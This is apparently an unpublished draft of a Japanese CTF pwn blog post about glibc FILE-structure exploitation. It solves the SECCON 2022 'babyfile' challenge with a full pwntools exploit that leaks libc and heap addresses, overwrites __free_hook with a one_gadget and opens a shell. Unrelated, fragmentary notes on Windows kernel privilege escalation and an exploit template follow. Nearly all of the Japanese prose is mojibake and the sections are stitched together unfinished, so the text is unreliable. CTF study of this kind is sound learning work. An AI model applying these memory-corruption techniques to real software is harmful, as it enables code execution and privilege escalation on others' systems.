---
title: "ã€CTF æ¢è¨ªè¨˜ã€‘File Structure Oriented Programming"
emoji: "ğŸ“˜"
type: "tech" # tech: æŠ€è¡“è¨˜äº‹ / idea: ã‚¢ã‚¤ãƒ‡ã‚¢
topics: ["CTF", "pwn"]
published: false
---

pwn ã¨ã„ã†ã®ã¯ãƒ¡ãƒ¢ãƒªã®æ›¸ãæ›ãˆã‚„èª­ã¿å–ã‚Šãªã©ã®ä½ãƒ¬ã‚¤ãƒ¤ãƒ¼ã®è„†å¼±æ€§ã‚’ç”¨ã„ã¦æ„å›³ã—ãªã„å‹•ä½œã‚’å¼•ãèµ·ã“ã•ã›ã‚‹ç«¶æŠ€ã§æœ€ã‚‚ãƒãƒƒã‚­ãƒ³ã‚°ã£ã½ã„åˆ†é‡ã§ã™ã€‚

- [Stack Exploits](https://zenn.dev/anko/articles/ctf-stack-exploits)
- [Heap Exploits](https://zenn.dev/anko/articles/ctf-heap-exploits)

ä»Šå›ã¯

### _IO_FILE æ§‹é€ ä½“ã®æ›¸ãæ›ãˆ

```c
struct _IO_FILE
{
  int _flags;                /* High-order word is _IO_MAGIC; rest is flags. */
  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;        /* Current read pointer */
  char *_IO_read_end;        /* End of get area. */
  char *_IO_read_base;        /* Start of putback+get area. */
  char *_IO_write_base;        /* Start of put area. */
  char *_IO_write_ptr;        /* Current put pointer. */
  char *_IO_write_end;        /* End of put area. */
  char *_IO_buf_base;        /* Start of reserve area. */
  char *_IO_buf_end;        /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};

```

```c
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};

```

```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
#if 0
    get_column;
    set_column;
#endif
};
```

- [ãƒ’ãƒ¼ãƒ—ç³»å•é¡Œã«ãŠã‘ã‚‹stdout / stderrã‚’åˆ©ç”¨ã—ãŸãƒ¡ãƒ¢ãƒªãƒªãƒ¼ã‚¯ - CTFã™ã‚‹ã](https://ptr-yudai.hatenablog.com/entry/2019/05/31/235444)
# babyfile upsolve

https://github.com/SECCON/SECCON2022_online_CTF

source code
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static int menu(void);
static int getnline(char *buf, int size);
static int getint(void);

#define write_str(s) write(STDOUT_FILENO, s, sizeof(s)-1)

int main(void){
        FILE *fp;

        alarm(60);

        write_str("Play with FILE structure\n");

        if(!(fp = fopen("/dev/null", "r"))){
                write_str("Open error");
                return -1;
        }
        fp->_wide_data = NULL;

        for(;;){
                switch(menu()){
                        case 0:
                                goto END;
                        case 1:
                                fflush(fp);
                                break;
                        case 2:
                                {
                                        unsigned char ofs;
                                        write_str("offset: ");
                                        if((ofs = getint()) & 0x80)
                                                ofs |= 0x40;
                                        write_str("value: ");
                                        ((char*)fp)[ofs] = getint();
                                }
                                break;
                }
                write_str("Done.\n");
        }

END:
        write_str("Bye!");
        _exit(0);
}

static int menu(void){
        write_str("\nMENU\n"
                        "1. Flush\n"
                        "2. Trick\n"
                        "0. Exit\n"
                        "> ");

        return getint();
}

static int getnline(char *buf, int size){
        int len;

        if(size <= 0 || (len = read(STDIN_FILENO, buf, size-1)) <= 0)
                return -1;

        if(buf[len-1]=='\n')
                len--;
        buf[len] = '\0';

        return len;
}

static int getint(void){
        char buf[0x10] = {};

        getnline(buf, sizeof(buf));
        return atoi(buf);
}
```

/dev/null ã‚’é–‹ã„ãŸFILEæ§‹é€ ä½“ã«å¥½ãæ”¾é¡Œæ›¸ãè¾¼ã‚ã‚‹
fflushã§ãã‚‹ã¨ãã©ã†ã‚„ã£ã¦shellã«ã¤ãªã’ã‚‹ã‹

### leak

vtableã‚’ç›´æ¥æ”¹ã–ã‚“ã™ã‚‹ã®ã¯ç„¡ç†(ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒç‰¹å®šã‚»ã‚¯ã‚·ãƒ§ãƒ³ã®ç¯„å›²å†…ã«ã‚ã‚‹ã‹ãƒã‚§ãƒƒã‚¯ã™ã‚‹ã®ã§)
vtableã‚’ãšã‚‰ã™ã“ã¨ã¯ã§ãã‚‹

ã¨ã‚Šã‚ãˆãšheapé ˜åŸŸã®bufferã‚’ `_IO_write_*`ã«è¨­å®šã§ããŸ

glibc-2.31ã®ã‚³ãƒ¼ãƒ‰ã‚’èª­ã‚€ã¨
 `_IO_new_file_sync -> _IO_do_flush -> _IO_do_write -> ... -> new_do_write`
 ã¿ãŸã„ãªæµã‚ŒãŒã‚ã‚‹ `_IO_do_flush`ã§ã¯write_baseã‹ã‚‰write_ptrã®ä½ç½®ã¾ã§å‡ºåŠ›ã‚’åãå‡ºã™
 ãã®ãŸã‚filenoã‚’STDOUT_fileno(=1)ã«è¨­å®šã—ã¦write_baseã‚’é©å½“ã«å·»ãæˆ»ã™ã¨å‡ºåŠ›ã•ã‚Œã‚‹ã€‚
 (ã“ã®ã¨ãnew_do_writeã®åˆ†å²ã®ãŸã‚ã«read_endã‚‚write_baseã¨åŒã˜å€¤ã«ã—ã¦ãŠãå¿…è¦ãŒã‚ã‚‹)
 1/16ãªã®ã§è‹¥å¹²ã ã‚‹ã„

 leakå®Œäº†

### control PC

IO_new_file_flushã§vtableã®_IO_new_file_syncã‚’å‘¼ã³å‡ºã™ã¨
å¼•æ•°ã¯`(FILE *,int?,heap addr)`ã«ãªã‚‹ vtableé–¢æ•°ã®ä¸­ã‹ã‚‰ã“ã®å¼•æ•°ã§AAW or get PCã§ãã‚‹ã‚‚ã®ã‚’æ¢ã™ã—ã‹ãªã„

å¼•æ•°çš„ã«ã‚ã‚Šãˆãã†ãªå€™è£œ
- `_IO_finish_t(FILE *,int)`
- `_IO_overflow_t(FILE *,int)`
- `_IO_overflow_t(FILE *,int)`
- `_IO_pbackfail_t(FILE *)`
- `_IO_seekoff_t(FILE *,off64_t,int)`
- `_IO_seekpos_t(FILE *,off64_t,int)`

### toketa
```python
from pwn import *

#context.terminal = ['tmux','splitw','-h']
context.terminal = ['open_tab.sh']

read_ptr = 0x8
read_end = 0x10
read_base = 0x18
write_base = 0x20
write_ptr = 0x28
write_end = 0x30

while True:
    io = process('./chall')

    def fflush():
        io.sendlineafter(b'> ',b'1')

    def overwrite(off,val):
        io.sendlineafter(b'> ',b'2')
        io.sendlineafter(b'offset: ',str(off).encode())
        io.sendlineafter(b'value: ',str(val).encode())

    def overwrite_word(off,val):
        for i in range(8):
            overwrite(off+i,val & 0xff)
            val >>= 8

    fflush()
    fflush()

    overwrite(0xd8,0xa8)
    fflush()

    log.info("called _IO_file_doallocate")

    overwrite(0xd8,0x60)
    fflush()

    log.info("called _IO_file_underflow")

    overwrite(0xd8,0xa0)
    overwrite(0x70,0x1)
    overwrite(0x20,0x90)
    overwrite(0x21,0x12)
    overwrite(0x10,0x90)
    overwrite(0x11,0x12)

    log.info("overwrite read_end,write_base")

    fflush()

    log.info("leak by _IO_new_file_sync")

    buf = io.recv(0x80)
    if len(buf) != 0x80:
        io.close()
        continue

    libc_base = u64(buf[0x78:0x80]) + 0x7f13af008000 - 0x7f13af1f55c0
    heap_base = u64(buf[0x18:0x20]) + 0x564653a51000 - 0x564653a5350f
    log.info(f'libc_base = {hex(libc_base)}')
    log.info(f'heap_base = {hex(heap_base)}')

    gdb.attach(io,'''
            b *main+121
            c
            set $foo = *((long *)$rsp + 1)
    ''')

    input()

    def AAW(addr,val):
        overwrite_word(0xd8,libc_base + 0x7f30d22140e0 - 0x7f30d202b000)
        overwrite_word(0xf0,addr)
        overwrite_word(0xf8,addr)
        overwrite_word(write_base,0)
        overwrite_word(write_ptr,val)
        fflush()

    free_hook = libc_base + 0x7f6822dbde48 - 0x7f6822bcf000
    one_gadget = libc_base + 0xe3b01

    AAW(free_hook,one_gadget)

    log.info('overwrite free_hook')

    IO_file_jumps = libc_base + 0x7fba711e64a0 - 0x7fba70ffd000

    overwrite_word(0xd8,IO_file_jumps - 0x50)
    overwrite_word(0x70,0xffffffffffffffff)

    log.info('prepared finish->free')

    fflush()

    io.interactive()

    break
```

https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique

Windows OS ã®æ­´å²



Service Pack
å¾Œã§ Kernel Driver ã®è„†å¼±æ€§ã‚’çªã„ã¦ kASLR, NX, SMEP, SMAP, kCFG, HVCI ãªã©ã®ã‚«ãƒ¼ãƒãƒ«ãƒ¢ãƒ¼ãƒ‰ã®ç·©å’Œç­–ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã€æ¨©é™æ˜‡æ ¼ã™ã‚‹ã“ã¨ã‚’ç›®æŒ‡ã—ã¾ã™ã€‚
## Kernel Exploit
æ¨©é™æ˜‡æ ¼ (Priviladge Escalation) ã¨ã¯ãã®åã®é€šã‚Šä½ã„æ¨©é™ã‹ã‚‰é«˜ã„æ¨©é™ã¸æ˜‡æ ¼ã—ã¦ã€ã‚ˆã‚Šå¹…åºƒã„ã“ã¨ãŒå®Ÿè¡Œã§ãã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚æ¨©é™æ˜‡æ ¼ã®æ–¹æ³•ã«ã¯ 2 ã¤ã‚ã‚Šã¾ã™ã€‚

- ã‚«ãƒ¼ãƒãƒ«ãƒ¢ãƒ¼ãƒ‰ä¸­ã«ä»»æ„ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œã™ã‚‹
- ã‚¢ã‚¯ã‚»ã‚¹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€

æ˜”ã¯ [NtQuerySystemInformation é–¢æ•°](https://learn.microsoft.com/ja-jp/windows/win32/api/winternl/nf-winternl-ntquerysysteminformation) ã‚’ç”¨ã„ã¦ ntoskrnl.exe ã«ã‚ã‚‹ HalDispatchTable ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å–å¾—ã€æ›¸ãæ›ãˆã¦ NtQueryIntervalProfile é–¢æ•°ã‚’å‘¼ã¶ã“ã¨ã§ã‚«ãƒ¼ãƒãƒ«ãƒ¢ãƒ¼ãƒ‰ã§ HalDispatchTable ã‚’å‘¼ã³å‡ºã—ã€æ¨©é™æ˜‡æ ¼ã—ã¦ã„ãŸã®ã§ã™ãŒä½ã„ integrity ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å¯¾ã—ã¦ã¯ç¦æ­¢ã•ã‚ŒãŸã®ã§ä»Šã¯å³ã—ã„ã§ã™ã€‚

https://inaz2.hatenablog.com/entry/2015/09/15/121926

NonPagedPool ã‚’å®Ÿè¡Œå¯èƒ½ã§ Kenrel mode ã‹ã‚‰å®Ÿè¡Œã™ã‚‹
Windows Kernel Driver ã®è„†å¼±æ€§
- tagWND
- GdiSharedHandleTable -> kernel address æ¶ˆã™,
- Page Table Entry overwrite

### Token Stealing

### tagWND
- Window Function running in kernel mode

tagWND ã®å¾Œã® Window Extra Data ã®é•·ã• cbwndExtra ã‚’å¤§ããã™ã‚‹ã“ã¨ã§ AAR, AAW ã‚’å¯èƒ½ã«ã™ã‚‹è„†å¼±æ€§ã§ã™ã€‚
gSharedInfo
aheList
tagMenu, tagWND

## ãƒ’ãƒ¼ãƒ—é ˜åŸŸ

ãƒ’ãƒ¼ãƒ—ã‹ã‚‰ã®ãƒ¡ãƒ¢ãƒªå‰²ã‚Šå½“ã¦ (HeapCreate, HeapAlloc, HeapFree)
ä»®æƒ³ãƒ¡ãƒ¢ãƒªã®ç›´æ¥ã®å‰²ã‚Šå½“ã¦ (VirtualAlloc, VirtualAllocEx)

| Allocation Size | Granularity | Bucket |
| --- | --- | --- |
| 1 ~ 1,024 bytes (0x1 ~ 0x400) | 16 bytes | 1 ~ 64 |
| 1,025 ~ 2,048 bytes (0x401 ~ 0x800) | 64 bytes | 65 ~ 80 |
| 2,049 ~ 4,096 bytes (0x801 ~ 0x1000) | 128 bytes | 81 ~ 96 |
| 4,097 ~ 8,192 bytes (0x1001 ~ 0x2000) | 256 bytes | 97 ~ 112 |
| 8,193 ~ 16,368 bytes (0x2001 ~ 0x3FF0) | 512 bytes | 113 ~ 128 |

ãƒ¡ãƒ¢ãƒªå‰²ã‚Šå½“ã¦ã® API
CoTaskMemAlloc
GlobalAlloc
HeapAlloc
LocalAlloc
malloc
new
VirtualAlloc

Heap Terminate On Corruption
ãƒ’ãƒ¼ãƒ—ãŒç ´æã—ãŸå ´åˆã«ãƒ—ãƒ­ã‚»ã‚¹ã‚’å¼·åˆ¶çµ‚äº†ã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦ã€ãƒ’ãƒ¼ãƒ—ç ´æã®ä¾‹å¤–ãƒãƒ³ãƒ‰ãƒ©ã‚’æ‚ªç”¨ã™ã‚‹æ”»æ’ƒã‚„æ™‚ã€…ãƒ’ãƒ¼ãƒ—ã®ç ´æã‚’èµ·ã“ã™ç¨‹åº¦ã® Exploit ã‚’é˜²å¾¡ã™ã‚‹ã¨ã„ã†ã€ãƒ’ãƒ¼ãƒ—ã®æ•´åˆæ€§ã‚’æ¤œè¨¼ã™ã‚‹æ©Ÿèƒ½*3ã€‚HeapSetInformation é–¢æ•°




## ãƒ„ãƒ¼ãƒ«
ãƒ­ãƒ¼ã‚«ãƒ«ã§å®Ÿè¡Œãƒã‚¤ãƒŠãƒªã‚’å‹•ã‹ã—ã¦è§£æã—ãŸã„ã¨ããƒ‡ãƒãƒƒã‚¬ãƒ¼ãŒé‡å®ã—ã¾ã™ã€‚ELF ã®ãƒ‡ãƒ•ã‚¡ã‚¯ãƒˆã‚¹ã‚¿ãƒ³ãƒ€ãƒ¼ãƒ‰ãªãƒ‡ãƒãƒƒã‚¬ãƒ¼ã¯ gdb ã§ã€ä½¿ã„æ–¹ã¯ä»–ã®è¨˜äº‹ã‚’å‚è€ƒã«ã—ã¦ãã ã•ã„ã€‚

ã¾ãŸã€gdb ã«æ‹¡å¼µçš„ãªæ©Ÿèƒ½ã‚’ä¸ãˆã‚‹ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚‚é–‹ç™ºã•ã‚Œã¦ã„ã¦ã€ç¾åœ¨ã€ä¸»è¦ãªãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã¯æ¬¡ã®ã‚ˆã†ãªã‚‚ã®ã§ã™ã€‚å…¨éƒ¨ã‚»ãƒƒãƒˆã§å…¥ã‚Œã‚‰ã‚Œã‚‹ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ©ãƒ¼ã‚‚ã‚ã‚Šã¾ã™ã€‚

- gdb-peda
- pwndbg (ã‚³ãƒãƒ³ãƒ‰ãŒè±Šå¯Œã§ãŠã™ã™ã‚)
- gef

https://github.com/apogiatzis/gdb-peda-pwndbg-gef

å¤§æŠµã®å•é¡Œã¯ `nc` ã‚³ãƒãƒ³ãƒ‰ã§ã‚µãƒ¼ãƒãƒ¼ã«æ¥ç¶šã—ã¦ãƒã‚¤ãƒŠãƒªãŒå®Ÿè¡Œã•ã‚Œã‚‹ã‚ˆã†ãªå½¢å¼ã§ä¸»é¡Œã•ã‚Œã€å®Ÿè¡Œãƒã‚¤ãƒŠãƒªã‚„ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚‚é…ã‚‰ã‚Œã‚‹ã“ã¨ã‚‚ã‚ã‚Šã¾ã™ã€‚ã“ã®é€šä¿¡ã‚’ç°¡å˜ã«å–ã‚Šæ‰±ã„ãŸã„ã€ã¾ãŸãƒã‚¤ãƒŠãƒªã‚’è§£æã—ãŸã„ã¨ã„ã†ãƒ¢ãƒãƒ™ãƒ¼ã‚·ãƒ§ãƒ³ã§ä½œã‚‰ã‚ŒãŸ pwntoolsã€ãã—ã¦ãã‚Œã‚’æ”¹è‰¯ã—ãŸ ptrlib ã¨ã„ã† Python ã®ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®ã‚ˆã†ãªä¾¿åˆ©ãªãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ãŒå¤šãã€è¨€èªã¯ Python ãŒé¸ã°ã‚Œã‚„ã™ã„ã§ã™ã€‚

https://github.com/Gallopsled/pwntools
https://github.com/ptr-yudai/ptrlib

pwn ã§ç§ãŒã„ã¤ã‚‚ä½¿ã£ã¦ã„ã‚‹ Python ã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã§ã™ã€‚

```python
from pwn import *
import sys

binary_path = './chall'

if len(sys.argv) == 3:
    io = remote(sys.argv[1], int(sys.argv[2]))
else:
    io = process(binary_path)
elf = ELF(binary_path)
# libc = ELF("./libc.so.6")
# system_offset = libc.symbols['system']
# binsh_offset = next(libc.search('/bin/sh\x00'))

def wait_for_attach():
    print('attach?')
    raw_input()

payload = b''
io.sendlineafter(b'> ', payload)
io.recvline()
io.interactive()
```
